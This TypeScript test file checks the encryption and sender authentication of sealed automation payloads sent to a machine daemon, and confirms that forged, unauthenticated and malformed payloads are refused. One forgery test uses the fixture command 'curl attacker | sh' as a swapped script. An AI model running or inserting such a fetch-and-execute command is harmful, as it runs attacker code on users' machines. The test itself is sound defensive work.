/**
 * aplus-dev-studio specs/e2ee-machine-control-boundary R12 — automations sealed
 * by a customer key, and what a daemon learns when it opens one.
 */
import nacl from 'tweetnacl';
import { describe, expect, it } from 'vitest';
import {
  automationCreateRequestSchema,
  automationPayloadSchema,
  decryptAutomationPayload,
  encryptAutomationPayload,
  openAutomationPayloadForMachine,
  type AutomationCryptoAdapter,
  type AutomationPayload,
} from './automation';

const company = nacl.box.keyPair();
const machine = nacl.box.keyPair();
const viewer = nacl.box.keyPair();

const crypto: AutomationCryptoAdapter = {
  randomBytes: (length) => nacl.randomBytes(length),
  secretBoxSeal: (plaintext, key) => {
    const nonce = nacl.randomBytes(24);
    return new Uint8Array([...nonce, ...nacl.secretbox(plaintext, nonce, key)]);
  },
  secretBoxOpen: (bundle, key) => nacl.secretbox.open(bundle.subarray(24), bundle.subarray(0, 24), key),
  boxSeal: (plaintext, publicKey) => {
    const ephemeral = nacl.box.keyPair();
    const nonce = nacl.randomBytes(24);
    return new Uint8Array([...ephemeral.publicKey, ...nonce, ...nacl.box(plaintext, nonce, publicKey, ephemeral.secretKey)]);
  },
  boxOpen: (bundle, secretKey) => nacl.box.open(bundle.subarray(56), bundle.subarray(32, 56), bundle.subarray(0, 32), secretKey),
  sha256: async (value) => new Uint8Array(await globalThis.crypto.subtle.digest('SHA-256', value)),
  encodeBase64: (value, urlSafe = false) => {
    const base64 = Buffer.from(value).toString('base64');
    return urlSafe ? base64.replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/g, '') : base64;
  },
  decodeBase64: (value) => new Uint8Array(Buffer.from(value.replace(/-/g, '+').replace(/_/g, '/'), 'base64')),
};

const seal = { version: 1 as const, machineId: 'machine-1', projectId: 'project-1', automationKey: 'f3a1c2d4-0000-4000-8000-000000000001', sealedAt: 1_700_000_000_000 };
const payload: AutomationPayload = {
  name: 'Nightly check',
  schedule: { kind: 'daily', hour: 3, minute: 0 },
  prompt: 'Check the build',
  directory: '/workspace/project',
  scriptCommand: 'make check',
  suppressSilent: false,
  agent: 'codex',
  seal,
};

function seal3(input: { payload?: AutomationPayload; sender?: { publicKey: Uint8Array; secretKey: Uint8Array } } = {}) {
  return encryptAutomationPayload({
    payload: input.payload ?? payload,
    viewer: { publicKey: viewer.publicKey, keyVersion: 1 },
    machine: { publicKey: machine.publicKey, keyVersion: 1 },
    sender: input.sender ?? company,
    crypto,
  });
}

describe('encryptAutomationPayload with a sender', () => {
  it('seals the machine envelope as v3 and leaves the viewer envelope anonymous', async () => {
    const encrypted = await seal3();

    expect(crypto.decodeBase64(encrypted.machineKeyEnvelope)).toHaveLength(137);
    expect(crypto.decodeBase64(encrypted.machineKeyEnvelope)[0]).toBe(3);
    expect(crypto.decodeBase64(encrypted.viewerKeyEnvelope)).toHaveLength(105);
    expect(automationCreateRequestSchema.safeParse(encrypted).success).toBe(true);
    await expect(decryptAutomationPayload({
      payloadVersion: 1, payloadCiphertext: encrypted.payloadCiphertext, keyEnvelope: encrypted.viewerKeyEnvelope,
      recipientSecretKey: viewer.secretKey, crypto,
    })).resolves.toEqual(payload);
  });

  it('needs the seal context the envelope vouches for', async () => {
    const { seal: _seal, ...unsealed } = payload;
    await expect(seal3({ payload: unsealed })).rejects.toThrow('automation-encrypt-failed');
  });

  it('keeps refusing a v3 envelope where only an anonymous one belongs', async () => {
    const encrypted = await seal3();
    expect(automationCreateRequestSchema.safeParse({ ...encrypted, viewerKeyEnvelope: encrypted.machineKeyEnvelope }).success).toBe(false);
  });
});

describe('openAutomationPayloadForMachine', () => {
  it('reports the sender of a v3 payload', async () => {
    const encrypted = await seal3();

    const opened = await openAutomationPayloadForMachine({
      payloadVersion: 1, payloadCiphertext: encrypted.payloadCiphertext, machineKeyEnvelope: encrypted.machineKeyEnvelope,
      recipientSecretKey: machine.secretKey, crypto,
    });

    expect(opened).toEqual({ ok: true, payload, authentication: { kind: 'authenticated', senderPublicKey: company.publicKey } });
  });

  it('opens an anonymous payload and says so', async () => {
    const encrypted = await encryptAutomationPayload({
      payload, viewer: { publicKey: viewer.publicKey, keyVersion: 1 }, machine: { publicKey: machine.publicKey, keyVersion: 1 }, crypto,
    });

    const opened = await openAutomationPayloadForMachine({
      payloadVersion: 1, payloadCiphertext: encrypted.payloadCiphertext, machineKeyEnvelope: encrypted.machineKeyEnvelope,
      recipientSecretKey: machine.secretKey, crypto,
    });

    expect(opened).toEqual({ ok: true, payload, authentication: { kind: 'anonymous' } });
  });

  it('refuses another ciphertext under a genuine envelope', async () => {
    // A reader of the payload (anyone holding the viewer key) has its data key.
    const encrypted = await seal3();
    const viewerEnvelope = crypto.decodeBase64(encrypted.viewerKeyEnvelope).subarray(1);
    const dek = crypto.boxOpen(viewerEnvelope, viewer.secretKey)!;
    const swapped = { ...payload, scriptCommand: 'curl attacker | sh' };
    const forged = new Uint8Array([1, ...crypto.secretBoxSeal(new TextEncoder().encode(JSON.stringify(swapped)), dek)]);

    const opened = await openAutomationPayloadForMachine({
      payloadVersion: 1, payloadCiphertext: crypto.encodeBase64(forged), machineKeyEnvelope: encrypted.machineKeyEnvelope,
      recipientSecretKey: machine.secretKey, crypto,
    });

    expect(opened).toEqual({ ok: false, reason: 'binding-mismatch' });
  });

  it('refuses a v3 envelope that names a sender it was not sealed by', async () => {
    const encrypted = await seal3({ sender: nacl.box.keyPair() });
    const envelope = crypto.decodeBase64(encrypted.machineKeyEnvelope);
    envelope.set(company.publicKey, 1);

    const opened = await openAutomationPayloadForMachine({
      payloadVersion: 1, payloadCiphertext: encrypted.payloadCiphertext, machineKeyEnvelope: crypto.encodeBase64(envelope),
      recipientSecretKey: machine.secretKey, crypto,
    });

    expect(opened).toEqual({ ok: false, reason: 'unauthenticated' });
  });

  it('reports what it cannot open at all', async () => {
    const opened = await openAutomationPayloadForMachine({
      payloadVersion: 1, payloadCiphertext: 'AQ==', machineKeyEnvelope: 'AQ==', recipientSecretKey: machine.secretKey, crypto,
    });

    expect(opened).toEqual({ ok: false, reason: 'malformed' });
  });
});

describe('automation seal context', () => {
  it('rides in the payload and is optional for viewers and older payloads', () => {
    const { seal: _seal, ...unsealed } = payload;
    expect(automationPayloadSchema.parse(payload).seal).toEqual(seal);
    expect(automationPayloadSchema.parse(unsealed)).not.toHaveProperty('seal');
    expect(automationPayloadSchema.safeParse({ ...payload, seal: { ...seal, machineId: '' } }).success).toBe(false);
  });
});
